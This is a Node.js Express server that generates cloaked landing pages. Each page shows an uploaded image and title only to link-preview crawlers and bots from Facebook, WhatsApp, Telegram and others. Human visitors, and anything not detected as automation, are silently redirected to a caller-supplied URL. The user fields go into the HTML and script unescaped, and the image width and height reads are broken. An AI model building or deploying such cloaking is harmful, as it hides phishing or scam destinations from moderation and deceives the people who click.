import express from 'express';
import multer from 'multer';
import path from 'path';
import fs from 'fs/promises';
import { fileURLToPath } from 'url';
import { dirname } from 'path';
import cors from 'cors';
import dotenv from 'dotenv';

// Load environment variables from .env file
dotenv.config();

// Get the current file's directory
const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
const upload = multer({ dest: 'uploads/' });

app.use(express.static(path.join(__dirname, 'build')));
app.use(express.json());
app.use(cors());

app.post('/api/generate-landing', upload.single('image'), async (req, res) => {
    try {
        const { title, description, redirectUrl } = req.body;
        const imagePath = req.file.path;

        // Generate a unique ID for the landing page
        const landingId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);

        // Create the HTML content
        const htmlContent = `
<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${title}</title>
    <meta name="description" content="${description}">
    <meta name="image" content="/build/${req.file.filename}">
    <meta name="keywords" content="${title}">
    <meta name="robots" content="index, follow">
    <meta property="og:type" content="article">
    <meta property="og:title" content="${title}">
    <meta property="og:description" content="${description}">
    <meta property="og:image" content="/build/${req.file.filename}">
    <meta property="og:image:url" content="/build/${req.file.filename}">
    <meta property="og:image:type" content="image/${path.extname(req.file.originalname).slice(1)}">
    <meta property="og:image:width" content="${req.file.size.width}">
    <meta property="og:image:height" content="${req.file.size.height}">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="${title}">
    <meta name="twitter:description" content="${description}">
    <meta name="twitter:image" content="/build/${req.file.filename}">
    <script>
        function detectBot() {
            const botPatterns = [
                'bot', 'spider', 'crawl', 'slurp', 'facebook', 'whatsapp',
                'telegram', 'viber', 'twitter', 'discord', 'slack',
                'linkedin', 'skype', 'pinterest', 'zoom'
            ];

            const userAgent = navigator.userAgent.toLowerCase();

            if (botPatterns.some(pattern => userAgent.includes(pattern))) {
                return true;
            }

            if (navigator.webdriver || window.navigator.webdriver) {
                return true;
            }

            const automationTools = [
                '_phantom',
                '__nightmare',
                'callPhantom',
                'buffer',
                'awesomium',
                'cef',
                'selenium',
                'headless',
                'phantomjs',
                'nightmarejs',
                'rhino'
            ];

            for (const tool of automationTools) {
                if (window[tool]) {
                    return true;
                }
            }

            if (navigator.plugins.length === 0) {
                return true;
            }

            return false;
        }

        window.onload = function() {
            if (!detectBot()) {
                window.location.replace("${redirectUrl}");
            } else {
                document.getElementById('content').style.display = 'block';
            }
        };
    </script>
</head>
<body>
    <div id="content" style="display: none">
        <h1>${title}</h1>
        <img src="/build/${req.file.filename}" alt="${title}" width="${req.file.size.width}" height="${req.file.size.height}">
        <p>${description}</p>
    </div>
</body>
</html>
    `;

        // Ensure directories exist
        await fs.mkdir(path.join(__dirname, 'build'), { recursive: true });
        await fs.mkdir(path.join(__dirname, 'uploads'), { recursive: true });

        // Save the HTML file
        const htmlFilePath = path.join(__dirname, 'build', `${landingId}.html`);
        await fs.writeFile(htmlFilePath, htmlContent);

        // Move the original image to the build folder
        const finalImagePath = path.join(__dirname, 'build', req.file.filename);
        await fs.rename(imagePath, finalImagePath);

        // Use the correct port from the environment or default to 3000
        const port = process.env.PORT || 3000;
        const domain = process.env.DOMAIN || `http://localhost:${port}`;
        res.json({ url: `${domain}/build/${landingId}.html`, imageUrl: `${domain}/build/${req.file.filename}` });
    } catch (error) {
        console.error('Error generating landing page:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'build', 'index.html'));
});

// Use the port from the environment or default to 3000
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));